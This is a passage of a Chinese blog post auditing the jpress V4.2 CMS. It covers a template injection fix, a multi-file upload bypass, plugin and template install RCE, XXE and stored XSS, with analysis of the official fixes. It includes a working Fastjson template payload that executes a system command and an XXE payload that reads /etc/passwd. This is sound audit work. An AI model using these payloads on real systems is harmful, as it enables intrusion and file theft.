+<h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>我认为的修复方式会比较贴近于 Velocity 的一些修复方式，而 Velocity 到目前最新版本也没有提供沙盒或者防御方式，只能禁止或严格过滤用户输入进入 <code>Velocity.evaluate</code>。但是这一框架是作者团队自己编写的，并非 Velocity</p>
+<p>但是在这一个项目当中，我们可以去看一下 jpress V5.0.5 的版本当中是如何修复的，这个地方当时自己找的时候花了很久时间。</p>
+<p>jpress V5.0.5，也就是最新版本当中，是通过转义字符来修补这个漏洞的。挺妙的，代码量小且利用效率高，很强。它的修补手段是在 <code>getPara()</code> 方法处先做一个转义，具体代码的调用栈如下</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">cleanXss<span class="token operator">:</span><span class="token number">79</span><span class="token punctuation">,</span> <span class="token class-name">XSSHttpServletRequestWrapper</span> <span class="token punctuation">(</span>io<span class="token punctuation">.</span>jboot<span class="token punctuation">.</span>web<span class="token punctuation">.</span>xss<span class="token punctuation">)</span>
+getParameter<span class="token operator">:</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token class-name">XSSHttpServletRequestWrapper</span> <span class="token punctuation">(</span>io<span class="token punctuation">.</span>jboot<span class="token punctuation">.</span>web<span class="token punctuation">.</span>xss<span class="token punctuation">)</span>
+getParameter<span class="token operator">:</span><span class="token number">161</span><span class="token punctuation">,</span> <span class="token class-name">ServletRequestWrapper</span> <span class="token punctuation">(</span>javax<span class="token punctuation">.</span>servlet<span class="token punctuation">)</span>
+getPara<span class="token operator">:</span><span class="token number">189</span><span class="token punctuation">,</span> <span class="token class-name">Controller</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>jfinal<span class="token punctuation">.</span>core<span class="token punctuation">)</span>
+postComment<span class="token operator">:</span><span class="token number">148</span><span class="token punctuation">,</span> <span class="token class-name">ArticleController</span> <span class="token punctuation">(</span>io<span class="token punctuation">.</span>jpress<span class="token punctuation">.</span><span class="token keyword">module</span><span class="token punctuation">.</span>article<span class="token punctuation">.</span>controller<span class="token punctuation">.</span>front<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/cleanXSSDefendSSTI.png" class="">
+
+<p>跟进 <code>escapeHtml()</code> 方法，它调用了 <code>replaceEach()</code> 方法，<code>replaceEach()</code> 方法做了转义恶意字符的工作，有兴趣的师傅们可以跟进自行调试一下，很简单。</p>
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/replaceEach.png" class="">
+
+<h3 id="前台任意文件上传漏洞"><a href="#前台任意文件上传漏洞" class="headerlink" title="前台任意文件上传漏洞"></a>前台任意文件上传漏洞</h3><h4 id="影响接口-1"><a href="#影响接口-1" class="headerlink" title="影响接口"></a>影响接口</h4><pre class="line-numbers language-none"><code class="language-none">&#x2F;ucenter&#x2F;avatar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>漏洞影响域在 <code>/ucenter/avatar</code> 下，这里对应的接口找了很久，最后终于找到是在 <code>io.jpress.web.commons.controller.AttachmentController#upload</code> 处</p>
+<h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>产生漏洞的根本原因是，Web 应用程序允许上传一个 <code>file[]</code> 数组，而非单个文件，从而我们可以构造多个文件同时上传来绕过。</p>
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/uploadFileArray.png" class="">
+
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/V42Upload.png" class="">
+
+<p>直接讲代码非常抽象，我们这里先上 payload 打，通过上传多个文件，使后续的文件绕过恶意文件的判断</p>
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/MoreFilesUpload.png" class="">
+
+<p>攻击的效果是在 <code>/attachment</code> 文件夹下，能够上传我们的恶意文件，同样能够访问得到。但是这里有个小问题，我尝试上传 jsp 与 jspx 来写🐎，发现无法上传，但是上传 .war 和 .jar 都是可行的，有点奇怪（留个坑）</p>
+<ul>
+<li>具体的运行流程分析如下，先把断点下在 <code>upload()</code> 方法处</li>
+</ul>
+<p>一开始获取文件，并将第 0 个元素赋给 file</p>
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/GetFileIndexZero.png" class="">
+
+<p>在执行完 <code>getFile</code> 之后，可以看到，我们上传的文件已经被保存到了临时文件目录，也就是 attachment 目录下，这其实就是一个暂存的动作。</p>
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/attachmentUpload.png" class="">
+
+<p>紧接着，在65行，判断了文件是否合法，不合法就删除，对应的黑名单在 <code>unSafe()</code> 方法里面。</p>
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/UnSafe.png" class="">
+
+<p>接着往下走，进行了是否是 image 这个类型的判断，如果是 image 这个类型，则会限制上传的 image 大小。</p>
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/UploadLimited.png" class="">
+
+<p>至此对于上传文件的限制就结束了，所以我们看到程序对于多个文件的上传并未做严格的限制。通过上传多个文件可以绕过黑名单的判断。</p>
+<blockquote>
+<p>这个洞非常有意思，不仅给了 file 为数组的时候的绕过手段，在日后的渗透当中，也可以将 file 修改为 <code>file[]</code> 来攻击。</p>
+</blockquote>
+<h4 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><ul>
+<li>此处我的想法是不允许将 file 以数组的形式上传</li>
+</ul>
+<p>至于官方的修复也很妙，官方的修复方式是对业务影响最小的修复方式，我们可以来看一看 jpress V5.0.5 的代码</p>
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/uploadFilesJudge.png" class="">
+
+<p>先判断在数组文件当中，是否只有一个文件，如果只有一个文件，那么就通过 <code>get(0)</code> 获取到它，如果有多个文件，就将多个文件直接执行 delete 操作。</p>
+<p>妙！</p>
+<h3 id="插件安装处存在命令执行漏洞"><a href="#插件安装处存在命令执行漏洞" class="headerlink" title="插件安装处存在命令执行漏洞"></a>插件安装处存在命令执行漏洞</h3><h4 id="影响接口-2"><a href="#影响接口-2" class="headerlink" title="影响接口"></a>影响接口</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java">admin<span class="token operator">/</span>addon<span class="token operator">/</span>install<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>此处允许我们上传 jar 包，并不是允许上传 jar 包就一定会存在漏洞，具体漏洞的情况还要看内部有没有进行一些过滤的手法。</p>
+<p>找了很久对应的接口，最后发现是在 <code>io.jpress.web.admin._AddonController</code> 的<code>doUploadAndInstall()</code> 方法下做的对应业务。</p>
+<p>下个断点，我们先编写一个恶意的 jar 包，接着上传，开始调试。</p>
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/uploadJar.png" class="">
+
+<p>因为这也是一个文件上传点，所以依旧会存在多个文件绕过的方式。我们继续往下看，在获取到文件后，会判断是否是 zip 或是 jar 的文件类型。</p>
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/judgePluginType.png" class="">
+
+<p>继续往下，关键语句在 <code>readSimpleAddonInfo()</code> 处，<code>readSimpleAddonInfo()</code> 方法会把我们所有的东西保存到一个 Zip 包里面，当然 jar 包后续会打包成 jar 包。</p>
+<p>继续往下走，到第 118 行，这一个 <code>install()</code> 方法相当关键。</p>
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/installJar.png" class="">
+
+<p>跟进一下，它会走到 <code>AddonManager#install</code>，也就是开始执行 jar 包的插件安装，在第 206 行，跟进 <code>readAddonInfo()</code> 方法，跟进一下</p>
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/readAddonInfo.png" class="">
+
+<p>在这个方法里面会创建一个类加载器来加载插件里的类，这里又复用了一遍 <code>readSimpleAddonInfo()</code> 方法</p>
+
+
+<p>跟进 <code>classLoader.load()</code>，这个方法的作用就是先加载类，然后把不同的类进行归类，Controller 归到一起，Interceptor 归到一起</p>
+<p>先加载类</p>
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/loadClassFive.png" class="">
+
+<p>然后根据类的功能进行归类，把他们分别添加到了 addonInfo 的特定字段当中</p>
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/CategoriesClass.png" class="">
+
+<p>接下来在处理请求时就会利用到这些 controller，从而实现攻击。现在对于我们来说，访问 helloworld 这一个 controller 即可。执行命令执行。</p>
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/EvilHorseCommand.png" class="">
+
+<h4 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><ul>
+<li>官方作者这里并没有给出对应的修复方法……对应的解释如下</li>
+</ul>
+<p>“不处理这个问题，原因是：<br>1、必须获得 JPress 的后台登录地址，虽然有默认的登录地址，但是可配置成其他复杂的地址<br>2、拥有登录地址后，必须有管理员的账号和密码，这种一般只有设置了弱密码，或者管理员主动泄漏。<br>3、安装了 恶意 的插件</p>
+<p>而目前 Java 行业凡是对于可以安装插件的产品来讲，都是无法避免这个问题的。这个需要网站管理提高安全意识、设置复杂的登录地址和登录账号密码，不轻易安装不认可的插件即可解决。这种由于安全意识造成的问题，并非软件问题。”</p>
+<blockquote>
+<p>其实还是蛮能理解的……</p>
+</blockquote>
+<p>所以此处我认为并没有比较合适的修复手段……</p>
+<h3 id="模板安装处存在命令执行漏洞"><a href="#模板安装处存在命令执行漏洞" class="headerlink" title="模板安装处存在命令执行漏洞"></a>模板安装处存在命令执行漏洞</h3><h4 id="影响接口-3"><a href="#影响接口-3" class="headerlink" title="影响接口"></a>影响接口</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java">admin<span class="token operator">/</span>template<span class="token operator">/</span>install<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>断点下在 <code>io.jpress.web.admin._TemplateController</code> 下的 <code>doInstall()</code> 方法，上传一个恶意的 zip 文件，开始调试。</p>
+<p>一开始会进行判断，是否为 zip 文件</p>
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JudgeZip.png" class="">
+
+<p>经过一系列判断之后，到 155 行，155 行这里实际上做了一个文件 move 的操作，将文件先 “暂存”到了对应的文件夹下；到 156 行，进行 zip 压缩包的解压。</p>
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/unzip.png" class="">
+
+<p>具体的业务就不看了，比较简单，有兴趣的师傅可以跟着调试一下。</p>
+<p>在这之后，evil.zip 就成功被解析成 evil 文件夹，并保存到了对应的文件夹下。</p>
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/evilRestore.png" class="">
+
+<p>不过模板注入存在些许过滤，我们使用 Fastjson 来辅助获取 <code>ScriptEngineManager</code>，然后执行任意 js 代码，就可以实现 rce，payload 如下</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">#<span class="token function">set</span><span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span>ParserConfig</span><span class="token operator">::</span><span class="token function">getGlobalInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
+#<span class="token punctuation">(</span>x<span class="token punctuation">.</span><span class="token function">setAutoTypeSupport</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
+#<span class="token punctuation">(</span>x<span class="token punctuation">.</span><span class="token function">addAccept</span><span class="token punctuation">(</span><span class="token string">"javax.script.ScriptEngineManager"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
+#<span class="token function">set</span><span class="token punctuation">(</span>x<span class="token operator">=</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>JSON<span class="token operator">::</span><span class="token function">parse</span><span class="token punctuation">(</span>'<span class="token punctuation">&#123;</span><span class="token string">"@type"</span><span class="token operator">:</span><span class="token string">"javax.script.ScriptEngineManager"</span><span class="token punctuation">&#125;</span>'<span class="token punctuation">)</span><span class="token punctuation">)</span>
+#<span class="token function">set</span><span class="token punctuation">(</span>e<span class="token operator">=</span>x<span class="token punctuation">.</span><span class="token function">getEngineByName</span><span class="token punctuation">(</span><span class="token string">"js"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
+#<span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span>'<span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span>'<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>后台这个地方存在一个模板预览功能，这就用到了利用方式</p>
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/preViewFunc.png" class="">
+
+<p>开启之后可以通过 get 传入 template 参数来指定使用的模板，比如这里我们指定使用 <code>cn.jeanstudio.bonhumeur</code> 这个模板。而因为我们上传的是一个 html，所以我们可以直接访问 evil&#x2F;?template&#x3D;evil 来攻击</p>
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/EvilInstallTemplates.png" class="">
+
+<h4 id="漏洞修复-3"><a href="#漏洞修复-3" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>这里漏洞修复的方法比较巧妙，它禁止了在 html 中使用 <code>#set</code> 的调用，所以我们恶意的 payload 无法打成功，对应的过滤语句我没有找到，如果有师傅找到了请指点一下我（我太菜了www</p>
+<h3 id="从-WordPress-中导入文章功能存在-XXE-漏洞-在对应的低版本可以，V4-2-不行"><a href="#从-WordPress-中导入文章功能存在-XXE-漏洞-在对应的低版本可以，V4-2-不行" class="headerlink" title="从 WordPress 中导入文章功能存在 XXE 漏洞(在对应的低版本可以，V4.2 不行)"></a>从 WordPress 中导入文章功能存在 XXE 漏洞(在对应的低版本可以，V4.2 不行)</h3><h4 id="影响接口-4"><a href="#影响接口-4" class="headerlink" title="影响接口"></a>影响接口</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">/</span>admin<span class="token operator">/</span>setting<span class="token operator">/</span>tools<span class="token operator">/</span>wordpress<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>对应的业务点在 <code>io.jpress.module.article.controller.admin._WordpressImport#doWordPressImport</code> 处</p>
+<p>同样，这也是一个文件上传点，前面的就不看了，直接看 xml 解析的部分。</p>
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/wordPressXMLParser.png" class="">
+
+<p>跟进 <code>wordPressXmlParser.parse()</code>，里面就是正常的 XML 解析业务，但同时可以发现，此处禁止了 DTD 的使用，所以 V4.2 版本这里是不存在漏洞的。我们来看一看 V4.1.2 也就是存在漏洞的版本中的代码。</p>
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/412WordPressImport.png" class="">
+
+<p>V 4.1.2 版本当中未过滤任意 DTD，所以能够造成 XXE 漏洞攻击。</p>
+<p>payload 如下：</p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version = "1.0"?></span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">ANY</span> <span class="token punctuation">[</span><span class="token internal-subset">
+&lt;!ENTITY f SYSTEM "file:///etc/passwd">
+</span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>item</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">wp:</span>post_type</span><span class="token punctuation">></span></span>post<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">wp:</span>post_type</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">content:</span>encoded</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&f;">&amp;f;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">content:</span>encoded</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">wp:</span>status</span><span class="token punctuation">></span></span>draft<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">wp:</span>status</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>item</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="漏洞修复-4"><a href="#漏洞修复-4" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>禁用 DTD，代码可以参照 V4.2 版本的当中的</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">SAXParserFactory</span> factory <span class="token operator">=</span> <span class="token class-name">SAXParserFactory</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            factory<span class="token punctuation">.</span><span class="token function">setFeature</span><span class="token punctuation">(</span><span class="token string">"http://apache.org/xml/features/disallow-doctype-decl"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            factory<span class="token punctuation">.</span><span class="token function">setFeature</span><span class="token punctuation">(</span><span class="token string">"http://xml.org/sax/features/external-general-entities"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            factory<span class="token punctuation">.</span><span class="token function">setFeature</span><span class="token punctuation">(</span><span class="token string">"http://xml.org/sax/features/external-parameter-entities"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            factory<span class="token punctuation">.</span><span class="token function">setFeature</span><span class="token punctuation">(</span><span class="token string">"http://apache.org/xml/features/nonvalidating/load-external-dtd"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            factory<span class="token punctuation">.</span><span class="token function">setXIncludeAware</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="模板编辑处存在存储型-XSS-在对应的低版本可以，V4-2-不行"><a href="#模板编辑处存在存储型-XSS-在对应的低版本可以，V4-2-不行" class="headerlink" title="模板编辑处存在存储型 XSS(在对应的低版本可以，V4.2 不行)"></a>模板编辑处存在存储型 XSS(在对应的低版本可以，V4.2 不行)</h3><h4 id="影响接口-5"><a href="#影响接口-5" class="headerlink" title="影响接口"></a>影响接口</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java">admin<span class="token operator">/</span>template<span class="token operator">/</span>setting
+以及多个模板编辑处，此处不列举<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h4 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>在对应的接口处插入 XSS 语句</p>
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/SVGXSS.png" class="">
+
+<p>在前端界面处可以直接产生 XSS 的效果</p>
+<img src="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/XSSEffect.png" class="">
+
+<ul>
+<li>作者的意思是这里本身就允许编辑代码，所以并非属于漏洞。</li>
+</ul>
+<h4 id="漏洞修复-5"><a href="#漏洞修复-5" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>作者虽然比较“嘴硬”说了本身就允许编辑代码，所以并非属于漏洞，但还是偷偷把这个洞给修了（雾）</p>
+<p>作者这里的修复方法是加白，也就是说虽然这确实允许编辑代码，但是像 <code>alert()</code>、<code>svg</code> 这一种标签就不允许过，仅能过一些 <code>h1</code>、<code>h2</code> 这种非恶意标签。</p>
+<h2 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h2><ul>
+<li>在 jpress 当中存在的漏洞主要是因为过于信任用户的输入，同时给出的一些修复思路非常有趣，是一个很好的代码审计 CMS</li>
+</ul>
+<h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><p><a target="_blank" rel="noopener" href="https://github.com/JPressProjects/jpress/issues">https://github.com/JPressProjects/jpress/issues</a><br>以及 Erc111111 师傅的帮助 ———— <a target="_blank" rel="noopener" href="https://er1cccc.gitee.io/r2/">https://er1cccc.gitee.io/r2/</a></p>
+
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    
+<div class="article-copyright-info-container">
+    <ul class="copyright-info-content">
+        <li class="post-title">
+            <span class="type">本文标题</span>：<span class="content">jpress V4.2 代码审计</span>
+        </li>
+        <li class="post-author">
+            <span class="type">本文作者</span>：<span class="content">Drunkbaby</span>
+        </li>
+        <li class="post-time">
+            <span class="type">创建时间</span>：<span class="content">2022-11-06 11:23:45</span>
+        </li>
+        <li class="post-link">
+            <span class="type">本文链接</span>：<span class="content">2022/11/06/jpress-V4-2-代码审计/</span>
+        </li>
+        <li class="post-license">
+            <span class="type">版权声明</span>：<span class="content">本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！</span>
+        </li>
+    </ul>
+    <div class="copy-copyright-info flex-center tooltip" data-content="复制版权信息" data-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                </div>
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/Java/">#Java</a>&nbsp;
+                        </li>
+                    
+                        <li class="tag-item">
+                            <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">#代码审计</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+                <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                               rel="prev"
+                               href="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/"
+                            >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                                <span class="title flex-center">
+                                <span class="post-nav-title-item">Java OWASP SSTI 学习</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                            </a>
+                        </div>
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                               rel="next"
+                               href="/2022/11/02/Java-Struts2-%E5%AD%A6%E4%B9%A0%E4%B8%8E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"
+                            >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Java Struts2 学习与环境搭建</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                                <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+            
+                <div class="comment-container">
+                    
+<div class="comments-container">
+    <div id="comments-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments"></i>&nbsp;评论
+    </div>
+    
+        
+            
+
+    <div class="valine-container">
+        <script data-pjax src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+        <div id="vcomments"></div>
+        <script data-pjax>
+          function loadValine() {
+
+            const config = {
+              el: '#vcomments',
+              appId: 'mCIu9X4iLP3I0GikUoetB9bV-9Nh9j0Va',
+              appKey: 'ermlV1eoB1YODT088EdXjo6C',
+              meta: ['nick', 'mail', 'link'],
+              avatar: 'wavatar',
+              enableQQ: true,
+              placeholder: 'just go go',
+              lang: 'zh-CN'.toLowerCase()
+            }
+
+            if ('') {
+              config.serverURLs = ''
+            }
+
+            new Valine(config)
+
+            function getAuthor(language) {
+              switch (language) {
+                case 'en':
+                  return 'Author'
+                case 'zh-CN':
+                  return '博主'
+                default:
+                  return 'Master'
+              }
+            }
+
+            // Add "Author" identify
+            const getValineDomTimer = setInterval(() => {
+              const vcards = document.querySelectorAll('#vcomments .vcards .vcard')
+              if (vcards.length > 0) {
+                let author = 'Drunkbaby'
+
+                if (author) {
+                  for (let vcard of vcards) {
+                    const vnick_dom = vcard.querySelector('.vhead .vnick')
+                    const vnick = vnick_dom.innerHTML
+                    if (vnick === author) {
+                      vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
+                    }
+                  }
+                }
+                clearInterval(getValineDomTimer)
+              } else {
+                clearInterval(getValineDomTimer)
+              }
+            }, 2000)
+          }
+
+          if ('true' === 'true') {
+            const loadValineTimeout = setTimeout(() => {
+              loadValine()
+              clearTimeout(loadValineTimeout)
+            }, 1000)
+          } else {
+            window.addEventListener('DOMContentLoaded', loadValine)
+          }
+        </script>
+    </div>
+
+
+
+        
+    
+</div>
+
+                </div>
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">0x02 环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-text">0x03 代码审计</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%87%86%E5%A4%87"><span class="nav-text">代码审计准备</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9E%B6%E6%9E%84%E7%90%86%E8%A7%A3"><span class="nav-text">架构理解</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pom-xml-%E4%B8%8E-Filter-%E7%AD%89%E5%AE%A1%E8%AE%A1"><span class="nav-text">pom.xml 与 Filter 等审计</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A8%A1%E6%9D%BF%E6%B8%B2%E6%9F%93%E5%BC%95%E8%B5%B7%E7%9A%84-RCE"><span class="nav-text">模板渲染引起的 RCE</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E6%8E%A5%E5%8F%A3"><span class="nav-text">影响接口</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="nav-text">前台任意文件上传漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" 